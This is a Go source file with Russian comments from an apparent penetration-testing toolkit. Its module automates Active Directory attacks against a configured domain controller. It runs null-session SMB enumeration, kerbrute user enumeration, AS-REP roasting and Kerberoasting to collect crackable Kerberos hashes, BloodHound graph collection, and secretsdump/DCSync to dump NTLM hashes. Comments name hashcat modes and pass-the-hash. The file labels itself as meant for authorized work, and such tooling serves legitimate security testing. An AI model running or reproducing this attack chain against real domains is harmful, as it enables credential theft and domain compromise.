// Package ad — разведка Active Directory для АВТОРИЗОВАННЫХ внутренних работ.
// Оркестрирует стандартные тулы (запускаются, если установлены):
//
//   - netexec (nxc) — SMB/LDAP: null-сессия, подпись SMB, шары, юзеры, пароль-политика;
//   - enum4linux-ng — перечисление SMB/LDAP (юзеры, шары, ОС);
//   - kerbrute — перечисление валидных юзеров домена через Kerberos;
//   - impacket GetNPUsers — AS-REP roasting (юзеры без преаутентификации → хэши);
//   - impacket GetUserSPNs — Kerberoasting (SPN-аккаунты → хэши; нужны креды).
//
// Активный модуль: требует домен + контроллер домена в конфиге, пропускается в
// пассивном режиме. Хэши пишутся в находки (high) — их крекают офлайн (john/hashcat).
package ad

import (
	"context"
	"os/exec"
	"strings"

	"pentkit/internal/config"
	"pentkit/internal/event"
	"pentkit/internal/runner"
	"pentkit/internal/store"
)

// Run выполняет разведку AD по cfg.AD. Без домена/DC — тихо выходит.
func Run(ctx context.Context, cfg *config.Config, rn *runner.Runner, st *store.Store, ev event.Sink) {
	ad := cfg.AD
	if ad.Domain == "" || ad.DC == "" {
		ev.Logln("  AD не настроен (config.ad: domain + dc) — пропускаю")
		return
	}
	if rn.Passive {
		ev.Logln("  пассивный режим: модуль AD пропущен (активные запросы к DC)")
		return
	}
	ev.Logf("  AD: цель %s (DC %s)%s\n", ad.Domain, ad.DC, credNote(ad))

	nxcSMB(ctx, rn, st, ev, ad)
	enum4linux(ctx, rn, st, ev, ad)
	kerbrute(ctx, rn, st, ev, ad)
	asRepRoast(ctx, rn, st, ev, ad)
	kerberoast(ctx, rn, st, ev, ad)
	bloodhound(ctx, rn, st, ev, ad, st.Dir())
	secretsDump(ctx, rn, st, ev, ad)
}

func credNote(ad config.AD) string {
	if ad.Username != "" {
		return " как " + ad.Username
	}
	return " (без кредов)"
}

// nxcSMB — netexec по SMB: null-сессия, подпись, шары/юзеры (с кредами).
func nxcSMB(ctx context.Context, rn *runner.Runner, st *store.Store, ev event.Sink, ad config.AD) {
	bin := firstBin(rn, "nxc", "netexec", "crackmapexec")
	if bin == "" {
		ev.Logln("  ! netexec (nxc) не установлен — пропускаю SMB-энумерацию")
		return
	}
	args := []string{"smb", ad.DC}
	if ad.Username != "" {
		args = append(args, "-u", ad.Username, "-p", ad.Password)
	} else {
		args = append(args, "-u", "", "-p", "") // null-сессия
	}
	r := rn.Run(ctx, bin, args...)
	for _, line := range r.Lines {
		l := strings.TrimSpace(line)
		low := strings.ToLower(l)
		if strings.Contains(low, "signing:false") {
			st.Add(store.Finding{Target: ad.DC, Type: store.TypeAD, Severity: store.SevMedium,
				Title: "SMB signing отключён", Detail: "возможны relay-атаки (ntlmrelayx)",
				Evidence: trim(l, 200), Tool: bin, Tags: []string{"ad", "smb", "signing"}})
		}
		if strings.Contains(low, "[+]") && ad.Username == "" {
			st.Add(store.Finding{Target: ad.DC, Type: store.TypeAD, Severity: store.SevMedium,
				Title: "Доступна null-сессия SMB", Evidence: trim(l, 200),
				Tool: bin, Tags: []string{"ad", "smb", "null-session"}})
		}
	}
	// С кредами — шары и юзеры.
	if ad.Username != "" {
		shares := rn.Run(ctx, bin, "smb", ad.DC, "-u", ad.Username, "-p", ad.Password, "--shares")
		for _, line := range shares.Lines {
			low := strings.ToLower(line)
			if strings.Contains(low, "read") || strings.Contains(low, "write") {
				st.Add(store.Finding{Target: ad.DC, Type: store.TypeAD, Severity: store.SevInfo,
					Title: "SMB-шара доступна", Evidence: trim(strings.TrimSpace(line), 200),
					Tool: bin, Tags: []string{"ad", "smb", "share"}})
			}
		}
	}
	ev.Logln("  nxc smb: проверка завершена")
}

func enum4linux(ctx context.Context, rn *runner.Runner, st *store.Store, ev event.Sink, ad config.AD) {
	bin := firstBin(rn, "enum4linux-ng", "enum4linux")
	if bin == "" {
		return
	}
	r := rn.Run(ctx, bin, "-A", ad.DC)
	users := 0
	for _, line := range r.Lines {
		low := strings.ToLower(line)
		if strings.Contains(low, "username:") || strings.Contains(low, "user:") {
			users++
		}
		if strings.Contains(low, "null session") && strings.Contains(low, "allow") {
			st.Add(store.Finding{Target: ad.DC, Type: store.TypeAD, Severity: store.SevMedium,
				Title: "Null-сессия разрешена (enum4linux)", Evidence: trim(strings.TrimSpace(line), 200),
				Tool: bin, Tags: []string{"ad", "null-session"}})
		}
	}
	if users > 0 {
		st.Add(store.Finding{Target: ad.DC, Type: store.TypeAD, Severity: store.SevInfo,
			Title: "enum4linux: перечислено юзеров/записей ~" + itoa(users),
			Tool:  bin, Tags: []string{"ad", "enum"}})
	}
}

func kerbrute(ctx context.Context, rn *runner.Runner, st *store.Store, ev event.Sink, ad config.AD) {
	if !rn.Has("kerbrute") || ad.UserList == "" {
		if ad.UserList == "" {
			ev.Logln("  kerbrute: не задан config.ad.userlist — пропускаю перечисление юзеров")
		}
		return
	}
	r := rn.Run(ctx, "kerbrute", "userenum", "--dc", ad.DC, "-d", ad.Domain, ad.UserList)
	n := 0
	for _, line := range r.Lines {
		if strings.Contains(line, "VALID USERNAME") {
			n++
			st.Add(store.Finding{Target: ad.Domain, Type: store.TypeAD, Severity: store.SevLow,
				Title: "Валидный пользователь домена", Evidence: trim(strings.TrimSpace(line), 200),
				Tool: "kerbrute", Tags: []string{"ad", "user", "kerberos"}})
		}
	}
	if n > 0 {
		ev.Logf("  kerbrute: валидных юзеров %d\n", n)
	}
}

// asRepRoast — AS-REP roasting (GetNPUsers): юзеры без преаутентификации → хэши.
func asRepRoast(ctx context.Context, rn *runner.Runner, st *store.Store, ev event.Sink, ad config.AD) {
	bin := impacketBin(rn, "GetNPUsers")
	if bin == "" || ad.UserList == "" {
		return
	}
	r := rn.Run(ctx, bin, ad.Domain+"/", "-dc-ip", ad.DC, "-usersfile", ad.UserList,
		"-no-pass", "-request", "-format", "hashcat")
	n := 0
	for _, line := range r.Lines {
		if strings.HasPrefix(strings.TrimSpace(line), "$krb5asrep$") {
			n++
			st.Add(store.Finding{Target: ad.Domain, Type: store.TypeAD, Severity: store.SevHigh,
				Title:    "AS-REP roastable (хэш для офлайн-крекинга)",
				Detail:   "юзер без преаутентификации Kerberos — крекать hashcat -m 18200",
				Evidence: trim(strings.TrimSpace(line), 120) + "…", Tool: "GetNPUsers",
				Tags: []string{"ad", "kerberos", "asrep", "hash", "crackable"}})
		}
	}
	if n > 0 {
		ev.Logf("  AS-REP roast: хэшей %d\n", n)
	}
}

// kerberoast — Kerberoasting (GetUserSPNs): SPN-аккаунты → TGS-хэши. Нужны креды.
func kerberoast(ctx context.Context, rn *runner.Runner, st *store.Store, ev event.Sink, ad config.AD) {
	bin := impacketBin(rn, "GetUserSPNs")
	if bin == "" || ad.Username == "" {
		return
	}
	r := rn.Run(ctx, bin, ad.Domain+"/"+ad.Username+":"+ad.Password, "-dc-ip", ad.DC, "-request")
	n := 0
	for _, line := range r.Lines {
		if strings.HasPrefix(strings.TrimSpace(line), "$krb5tgs$") {
			n++
			st.Add(store.Finding{Target: ad.Domain, Type: store.TypeAD, Severity: store.SevHigh,
				Title:    "Kerberoastable SPN (хэш для офлайн-крекинга)",
				Detail:   "сервисный аккаунт с SPN — крекать hashcat -m 13100",
				Evidence: trim(strings.TrimSpace(line), 120) + "…", Tool: "GetUserSPNs",
				Tags: []string{"ad", "kerberos", "kerberoast", "hash", "crackable"}})
		}
	}
	if n > 0 {
		ev.Logf("  Kerberoast: хэшей %d\n", n)
	}
}

// bloodhound собирает граф AD (bloodhound-python). Нужны креды. Результат —
// JSON/zip в каталоге работы для импорта в BloodHound GUI.
func bloodhound(ctx context.Context, rn *runner.Runner, st *store.Store, ev event.Sink, ad config.AD, dir string) {
	if !rn.Has("bloodhound-python") || ad.Username == "" {
		return
	}
	ev.Logln("  bloodhound-python: собираю граф AD...")
	args := []string{"-d", ad.Domain, "-u", ad.Username, "-p", ad.Password,
		"-dc", ad.DC, "-ns", ad.DC, "-c", "All", "--zip", "-op", dir + "/bloodhound"}
	r := rn.Run(ctx, "bloodhound-python", args...)
	var detail string
	for _, line := range r.Lines {
		l := strings.TrimSpace(line)
		low := strings.ToLower(l)
		if strings.Contains(low, "found") && (strings.Contains(low, "user") || strings.Contains(low, "computer") || strings.Contains(low, "group")) {
			detail += trim(l, 80) + "; "
		}
		if strings.Contains(low, "compressing") || strings.Contains(low, ".zip") {
			detail += "zip собран; "
		}
	}
	if detail == "" {
		detail = "граф собран (см. *.json/zip в каталоге работы)"
	}
	st.Add(store.Finding{Target: ad.Domain, Type: store.TypeAD, Severity: store.SevInfo,
		Title: "BloodHound: граф AD собран", Detail: trim(detail, 300),
		Evidence: "импортируй " + dir + "/bloodhound*.zip в BloodHound для анализа путей атаки",
		Tool:     "bloodhound-python", Tags: []string{"ad", "bloodhound", "graph"}})
	ev.Logln("  bloodhound-python: готово")
}

// secretsDump выгружает NTLM-хэши (impacket secretsdump): SAM/LSA или NTDS
// (DCSync при доменных правах). Нужны креды. Выгруженные хэши — критично.
func secretsDump(ctx context.Context, rn *runner.Runner, st *store.Store, ev event.Sink, ad config.AD) {
	bin := impacketBin(rn, "secretsdump")
	if bin == "" || ad.Username == "" {
		return
	}
	ev.Logln("  secretsdump: выгружаю хэши...")
	target := ad.Domain + "/" + ad.Username + ":" + ad.Password + "@" + ad.DC
	r := rn.Run(ctx, bin, target)
	n := 0
	var sample string
	for _, line := range r.Lines {
		l := strings.TrimSpace(line)
		// формат NTLM: user:rid:lmhash:nthash:::
		if hashLine(l) {
			n++
			if sample == "" {
				sample = redactHash(l)
			}
		}
	}
	if n > 0 {
		st.Add(store.Finding{Target: ad.DC, Type: store.TypeAD, Severity: store.SevCritical,
			Title:    "secretsdump: выгружено NTLM-хэшей " + itoa(n),
			Detail:   "дамп учётных данных домена/хоста — крекать hashcat -m 1000 или pass-the-hash",
			Evidence: "пример: " + sample, Tool: bin,
			Tags: []string{"ad", "credentials", "ntlm", "hash", "crackable", "dcsync"}})
		ev.Logf("  secretsdump: хэшей %d\n", n)
	}
}

// hashLine распознаёт строку NTLM-дампа user:rid:lm:nt:::
func hashLine(s string) bool {
	p := strings.Split(s, ":")
	if len(p) < 4 {
		return false
	}
	return isHex32(p[2]) && isHex32(p[3])
}

func isHex32(s string) bool {
	if len(s) != 32 {
		return false
	}
	for _, c := range s {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
			return false
		}
	}
	return true
}

// redactHash прячет NT-хэш в доказательстве (виден юзер, не сам хэш).
func redactHash(s string) string {
	p := strings.Split(s, ":")
	if len(p) >= 4 && len(p[3]) == 32 {
		p[3] = p[3][:6] + "…" + p[3][28:]
		if isHex32(p[2]) {
			p[2] = "…"
		}
	}
	return trim(strings.Join(p, ":"), 120)
}

// --- утилиты ---

// firstBin возвращает первый установленный бинарник из списка.
func firstBin(rn *runner.Runner, names ...string) string {
	for _, n := range names {
		if rn.Has(n) {
			return n
		}
	}
	return ""
}

// impacketBin ищет impacket-скрипт в разных вариантах именования
// (impacket-GetNPUsers / GetNPUsers.py / GetNPUsers).
func impacketBin(rn *runner.Runner, name string) string {
	for _, cand := range []string{"impacket-" + name, name + ".py", name} {
		if _, err := exec.LookPath(cand); err == nil {
			return cand
		}
	}
	return ""
}

func trim(s string, n int) string {
	if len(s) > n {
		return s[:n] + "…"
	}
	return s
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var b [20]byte
	i := len(b)
	for n > 0 {
		i--
		b[i] = byte('0' + n%10)
		n /= 10
	}
	return string(b[i:])
}
